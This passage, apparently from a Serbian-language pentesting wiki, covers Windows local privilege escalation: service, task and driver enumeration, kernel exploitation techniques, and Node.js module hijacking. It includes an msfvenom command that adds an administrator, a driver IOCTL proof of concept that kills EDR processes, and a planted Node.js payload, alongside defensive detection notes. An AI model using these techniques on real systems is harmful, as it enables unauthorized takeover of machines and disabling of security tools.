wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću metasploit: `exploit/windows/local/trusted\_service\_path` Servisni binarni fajl možete ručno napraviti pomoću metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija može da se podesi tako da upućuje na binarnu datoteku. Ako je tu binarnu datoteku moguće zameniti, možda je moguća eskalacija privilegija. Više detalja nalazi se u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skripte koje pokreću zakazani zadaci

Za omogućeni zadatak koji pokreće `cmd.exe /c` sa datotekom `.bat` ili `.cmd`, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi i za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovan poziv PowerShell-a sa `-File`, proverite i ACL te skripte; promenljive, uslovi i ulančavanje komandi zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje predstavlja mogućnost izvršavanja između naloga samo ako se principal zakazanog zadatka razlikuje od pozivaoca i zadatak zaista stigne do te radnje. ACL koji dozvoljava samo dodavanje može biti bitan za skripte, ali raniji `exit` ili drugi tok kontrole mogu učiniti dodate linije nedostižnim. Pre nego što tvrdite da je moguća eskalacija, proverite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija. Popisivanje ne sme da menja skriptu niti da pokreće zadatak.

## Imenovani tokovi u dostupnim datotekama

Na NTFS-u čitljiva datoteka može da sadrži imenovani tok `:$DATA` čiji sadržaj nije prikazan u uobičajenom popisu direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, proverite **nazive i veličine** tokova pre otvaranja bilo kakvog sadržaja; Windows ih izlaže preko [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell preko [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Naziv toka koji nagoveštava da sadrži tajnu samo je trag. Proverite efektivni pristup za čitanje datoteke, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i na koji se nalog oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog popisivanja.

## Ulazi pomoćnog programa Windows Driver Kit koji pokreću zakazani zadaci

Opcioni Windows Driver Kit uključuje `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projektni fajl `working\rsf.rsf` iz direktorijuma iz kog se pokreće. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program sa privilegovanim nalogom može da pretvori pristup niskih privilegija za upis u te ulazne datoteke u izvršavanje komandi u kontekstu tog naloga, čak i kada je sama izvršna datoteka zaštićena. Proverite da li je potrošač privilegovan i da li **obe** prateće datoteke mogu da se kreiraju ili menjaju; samo pronalaženje pomoćnog programa nije dovoljno.

Za zakazani zadatak, proverite [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) njegove radnje i ACL-ove dveju putanja pratećih datoteka. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke samo je trag koji treba proveriti, a ne dokaz o tome gde zadatak čita ulazne datoteke. Takođe mora biti ispunjen preduslov za projektnu radnu datoteku. Proverite stvarni principal zadatka umesto da pretpostavite da se pokreće kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisa kada zamena nije uspela. Dobavljač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite punu instaliranu verziju zakrpe i da li se može pokrenuti operacija pogođenog agenta; oznaka grane kao što je `2.1` ne može da utvrdi izloženost. Enumeracija može da proveri verziju, stanje servisa i dozvole za Temp bez kreiranja datoteka ili pokretanja komandi agenta.

#### Pregled SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) uticao je na ADSelfService Plus build 6210 i starije verzije; dobavljač ga je ispravio u buildu 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Zato su unos instaliranog proizvoda ili putanja servisa samo naznaka, a ne potvrda ranjivosti: potvrdite tačan build, istoriju SAML konfiguracije, mrežnu dostupnost servisa i nalog pod kojim se pokreće. Izvršavanje koda preko servisa nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu pokrenutu kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda predstavlja zasebnu naznaku o šifrovanoj rezervnoj kopiji, a ne dokaz da su akreditivi upotrebljivi ili da postoji ova SAML ranjivost. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa bez raspakivanja.

#### Granice kontrolera Jenkins i domenskog naloga

Na Windows kontroleru Jenkins razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored или udaljeni okidač mogu да обезбеде други начин за покретање build-а, али потврдите да је омогућен и да се build заиста извршава. Извршавање користи идентитет контролера или изабраног агента, а сачувани акредитиви могу да се користе само ако им посао има приступ. Засебно проверите приступ метаподацима `JENKINS_HOME`: Jenkins чува материјал акредитива и кључеве за шифровање у `credentials.xml`, `secrets/hudson.util.Secret` и `secrets/master.key` ([Jenkins складиштење тајни](https://www.jenkins.io/doc/developer/security/secrets/)). Само њихово постојање не открива лозинку; проверите **приступ за читање неопходним датотекама** и посебан пут поновне употребе налога, без исписивања тајни у дељеном излазу. Ако тај налог има право уписа у `scriptPath` AD корисничког објекта, потврдите да је путања скрипте уписива и да постоји стварна пријава или заказани процес који је користи, а покреће се као циљни корисник, пре него што то третирате као извршавање између корисника. Додатна контрола групе захтева засебну проверу ефективних AD права.

#### Идентитет self-hosted агента Azure Pipelines

За пројекат Azure DevOps Server или Azure Pipelines раздвојте дозволу за **креирање или уређивање** pipeline-а од дозволе да се он **стави у ред за извршавање** и да се користи изабрани скуп агената; [Microsoft засебно документује дозволе за pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) и [ауторизацију скупа агената](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ако налог са нижим привилегијама може да пошаље корак скрипте и покрене тај pipeline на self-hosted Windows агенту, корак се извршава као [конфигурисани налог оперативног система агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Пре него што тврдите да је дошло до преласка између корисника или до SYSTEM-а, проверите конкретан pipeline, ограничења грана/ресурса, овлашћени скуп агената, извршиви посао и идентитет сервисног налога агента. Инсталирани агент, улога у пројекту или само право уписа у репозиторијум представљају тек наговештај; током пасивне enumerације прегледајте дозволе и локалне метаподатке сервиса, без покретања build-а.

#### Акредитиви Microsoft Entra Connect Sync

[Microsoft прави разлику](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) између **сервисног налога ADSync**, који покреће сервис за синхронизацију и приступа његовој SQL бази података, и **налога конектора AD DS**, чије дозволе у директоријуму зависе од конфигурисаних функција синхронизације. Акредитиви конектора чувају се шифровани у тој бази података, а кључни материјал је [заштићен помоћу DPAPI-ја под сервисним налогом ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Инсталирани сервис за синхронизацију, група чији назив сугерише локалне администраторске привилегије или сам приступ бази података не доказују да је акредитив могуће дешифровати нити да постоји начин за ескалацију привилегија у домену. Засебно проверите стварна права читања базе података, приступ сервисног налога/кључа, распоред инсталације и SQL-а, конфигурисани идентитет конектора и ефективне AD привилегије тог идентитета. Рутинска enumerација треба да приказује само метаподатке сервиса и приступа, а не да упитује или исписује сачуване тајне.

#### Дозволе за DLL-ове подршке управљачког програма штампача

Инсталирани управљачки програм штампача може да чува DLL-ове подршке у `C:\ProgramData` и да их учитава у процесу са вишим привилегијама за штампање. Проверите ACL-ове тачног директоријума управљачког програма и DLL-ова, укључујући надређене директоријуме и reparse points, чак и ако је WMI enumerација штампача одбијена. За [проблем управљачког програма штампача Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), пријављена путања била је `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [првобитно објављено обавештење](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) описује учитавање DLL-а преко `PrintIsolationHost.exe`. ACL који дозвољава упис само је наговештај: проверите ефективни приступ упису након примене deny уноса, да ли је одговарајући управљачки програм инсталиран и учитава ли датотеку под привилегованим идентитетом, као и да ли су ажурирани управљачки програм или безбедносни програм добављача отклонили проблем у инсталацији. Не закључујте да постоји рањивост само на основу назива директоријума или верзије управљачког програма.

### Дозволе за упис

Проверите да ли можете да измените неку конфигурациону датотеку како бисте прочитали неку посебну датотеку или да измените неки бинарни фајл који ће се извршавати под налогом администратора (schedtasks).

Слабости у дозволама за фасцикле/датотеке у систему можете да пронађете на следећи начин:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Učitavanje plugin-a Notepad++ pri pokretanju — persistence/execution

Notepad++ automatski učitava sve plugin DLL-ove iz svojih podfoldera `plugins`. Ako postoji instalacija koja se može menjati, bilo prenosiva ili kopija, ubacivanje zlonamernog plugin-a omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain` i callback funkcija plugin-a).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri pokretanju

**Proverite da li možete da izmenite neki registry ili binarnu datoteku koju će izvršiti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **lokacijama za automatsko pokretanje radi eskalacije privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **čudne ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže primitivu za proizvoljno čitanje/upis u kernel (česta pojava kod loše osmišljenih IOCTL handlera), možete eskalirati privilegije direktnom krađom SYSTEM tokena iz kernel memorije.<sup>[[13]](#references)</sup> Postupak korak po korak pogledajte ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Kod race-condition grešaka gde ranjivi poziv otvara putanju Object Manager-a koju kontroliše napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može produžiti prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF greške u cancel-safe queue-ovima, otkrivanje paged-pool memorije i I/O ring pivot-i

Neki Windows kernel LPE lanci mogu se napraviti od dve zasebno slabe greške: **race condition u životnom ciklusu cancel-safe queue-a** koja oslobađa zahtev/CBD dok je queue lock i dalje zaključan, i otkrivanja **lock-release-before-copy** koje otkriva oslobođenu paged-pool alokaciju tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Napomene za audit i eksploataciju:

- **Oslobađanje pod lock-om + naknadno otkazivanje**: potražite putanju uspeha koja radi **Acquire -> CompleteRequest/free -> Release**, а putanjу otkazivanja koja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspeha dođe do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre otpuštanja CBDQ/CSQ lock-a, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije da nastavi i prosledi oslobođeni `PFLT_CALLBACK_DATA` nazad u callback za uklanjanje u driver-u.
- **Ponovo zauzmite oslobođeni queue objekat** paged-pool alokacijom iste veličine koju kontroliše napadač. `NPFS` Data Queue Entries su korisni jer se sadržaj i veličina mogu kontrolisati, a kasnije ih možete ispitati operacijama pipe read/peek. Ako oslobođeni objekat sadrži list links, prepišite ih **cikličnom listom lažnih request node-ova u korisničkoj memoriji** da bi driver više puta obrađivao strukture zahteva koje definiše napadač, umesto da se zaustavi na početnom list head-u.
- **Unapredite predvidljiv upis**: ako lažni zahtev preusmeri ugnježdeni context pointer koji se koristi za upise u bookkeeping polja (vremenske oznake / QPC / polja uz refcount), možda ćete dobiti kernel upis čija se adresa može kontrolisati, ali ne i vrednost. U tom slučaju ciljajte polje **length/size** objekta iz pool spray-a umesto konačnog code/data pointer-a, a zatim prođite kroz spray dok oštećeni objekat ne omogući čitanje izvan granica paged-pool alokacije.
- **Obrazac podložan race condition-u za otkrivanje podataka**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se povećava ako napadač može da poveća bafer koji se kopira (na primer, dodavanjem mnogo stavki liste/resursa koje povećavaju konačnu veličinu serializer alokacije), jer duže kopiranje proširuje prozor za zamenu bez nužnog rušenja sistema.
- **Ciljevi za ponovnu alokaciju bogati pointer-ima**: Windows **I/O ring** nizovi registrovanih bafera odlični su ciljevi za otkrivanje podataka jer je njihova paged-pool veličina pod kontrolom napadača (`8 * regBufferCnt`), a svaki element je kernel pointer na `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatим oštetite **`RegBuffers`** i **`RegBuffersCount`** kako bi naredne I/O ring operacije koristile lažne unose koje je napravio napadač i omogućile proizvoljno čitanje/upis u kernel. Ako je jedini dostupan upis stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), koristite **preklapajuće neporavnate upise** da napravite korisnički pointer sa ponovljenim bajtom, kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i tamo smestite lažni niz registrovanih bafera.<sup>[[30]](#references)</sup>

Korisni indikatori za otklanjanje grešaka:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz korumpiranog I/O ring-a dobiješ arbitrary kernel read/write, ukradi SYSTEM token standardnim post-primitive postupkom:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivi za korupciju memorije registry hive-a

Moderne ranjivosti hive-ova omogućavaju pripremu determinističkih rasporeda, zloupotrebu upisivih potomaka HKLM/HKU i pretvaranje korupcije metapodataka u prekoračenja kernel paged pool-a bez prilagođenog driver-a. Kompletan lanac nauči ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion u direct režimu `RtlQueryRegistryValues` izazvan putanjama pod kontrolom napadača

Neki driver-i prihvataju registry putanju iz userland-a, proveravaju samo da li je ispravna UTF-16 niska, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i prosleđuju pokazivač na skalarni podatak sa steka, kao što je `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registry vrednosti, a ne tipu koji je developer očekivao.

Ovo omogućava dva korisna primitiva:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: apsolutna putanja `\Registry\...` pod kontrolom korisnika omogućava driver-u da upituje ključeve koje odabere napadač, otkrije njihovo postojanje preko povratnih kodova/zapisa i ponekad pročita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Korupcija kernel memorije**: odredište za skalarni podatak, kao što je `&readValue`, pogrešno se tumači kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa registry vrednosti.

Napomene za praktičnu eksploataciju:

- **Mitigacija u Windows 8+**: ako upit pogodi **untrusted hive** sa `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, kernel pozivi padaju uz `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, potraži **ključeve upisive od strane napadača unutar pouzdanih sistemskih hive-ova** umesto da postavljaš vrednosti pod `HKCU`.
- **Postavljanje vrednosti u pouzdanom hive-u**: koristi NtObjectManager da izlistaš upisive potomke putanje `\Registry\Machine`, a zatim ponovo pokreni skeniranje sa dupliranim token-om **low-integrity** da pronađeš ključeve dostupne iz sandboxovanih konteksta:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u 4-bajtni `int` oštećuje susedne podatke na steku i može delimično da prepiše obližnji pokazivač na callback/funkciju.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita `REG_DWORD` koji kontroliše napadač u skalarnu promenljivu na steku, a zatim ponovo upotrebi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa znakom. Ako prethodno čitanje `REG_DWORD` ostavi **negativnu** vrednost koju kontroliše napadač u ponovo upotrebljenoj skalarnoj promenljivoj, sledeći upit `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova na steku, što je često najjednostavniji put do potpunog prepisivanja pokazivača na callback.

Dobar obrazac za traženje: **različita čitanja iz registra u istu promenljivu na steku bez ponovne inicijalizacije**. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo korišćene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će se izvršiti drugo čitanje.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + EDR kill)

Neki potpisani drajveri trećih strana kreiraju svoj objekat uređaja sa jakim SDDL-om pomoću IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne sprovodi kada se uređaju pristupa preko putanje koja sadrži dodatnu komponentu, pa svaki neprivilegovani korisnik može da dobije handle koristeći putanju imenskog prostora kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz primera iz stvarnog sveta)

Kada korisnik može da otvori uređaj, može da zloupotrebi privilegovane IOCTL-ove koje drajver izlaže za LPE i neovlašćene izmene. Primeri mogućnosti zabeleženih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell putem DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upisivanje sirovog diska (neovlašćene izmene van mreže, trikovi za perzistenciju pri pokretanju).
- Gašenje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava gašenje AV/EDR-a iz user land-a preko kernela.

Minimalni obrazac PoC-a (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Ublažavanje rizika za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni DACL-om.
- Proverite kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite prekid procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite posredničke modele umesto direktnih privilegija kernela.

Ideje za detekciju za odbranu
- Pratite otvaranja sumnjivih naziva uređaja iz user-mode-a (npr. \\ .\\amsdk*) i određene sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoftovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/blokiranih stavki.


## PATH DLL Hijacking

Ako imate **dozvole za pisanje u fascikli koja se nalazi na PATH-u**, možda ćete moći da otmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Otmica razrešavanja modula Node.js / Electron putem `C:\node_modules`

Ovo je varijanta **nekontrolisane putanje pretrage u Windowsu** koja utiče na aplikacije **Node.js** i **Electron** kada izvršavaju uvoz modula bez putanje, kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node traži pakete penjući se kroz stablo direktorijuma i proveravajući fascikle `node_modules` u svakom nadređenom direktorijumu. U Windowsu, pretraga može da stigne do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može da proverava sledeće putanje:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa ovo predstavlja **LPE** kad god se cilj pokreće kao administrator, iz zakazanog zadatka sa povišenim privilegijama/omotača usluge ili iz aplikacije za radnu površinu sa povišenim privilegijama koja se automatski pokreće.

Ovo je naročito često kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja rad u slučaju greške
- je paket uklonjen iz produkcionih verzija, izostavljen tokom pakovanja ili instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, a ne u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da biste potvrdili putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka ciljnog procesa (`node.exe`, EXE datoteka aplikacije Electron ili proces omotača)
- Filtrirajte po `Path` `contains` `node_modules`
- Obratite pažnju na `NAME NOT FOUND` i poslednje uspešno otvaranje pod `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacija

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Kreirajte korenski direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Ubacite modul pod tačno očekivanim imenom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Primeri nedostajućih opcionih modula iz stvarnog sveta koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo primeniti: pronađite bilo koji **nedostajući bare import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` fajlove/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve runtime zavisnosti u paket i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana zbog obrazaca poput `try { require("...") } catch {}` koji ne prijavljuju greške.
- Onemogućite opcione provere ako biblioteka to podržava (na primer, neke `ws` implementacije mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts datoteka

Proverite da li su u hosts datoteci hardkodirani drugi poznati računari.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Spolja proverite da li postoje **ograničene usluge**.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija pokrenuta pod nalogom sa višim privilegijama zaseban je predmet provere: listener i putanja binarne datoteke pasivni su tragovi, dok putanja za iskorišćavanje greške u memoriji zahteva autentifikaciju i analizu baš te binarne datoteke i ulaza koji joj je dostupan. Ako deluje da otvoreni port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite koja je pozadinska usluga u pitanju; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila zaštitnog zida

[**Pogledajte ovu stranicu za komande povezane sa zaštitnim zidom**](../basic-cmd-for-pentesters.md#firewall) **(prikaz pravila, kreiranje pravila, isključivanje, isključivanje...)**

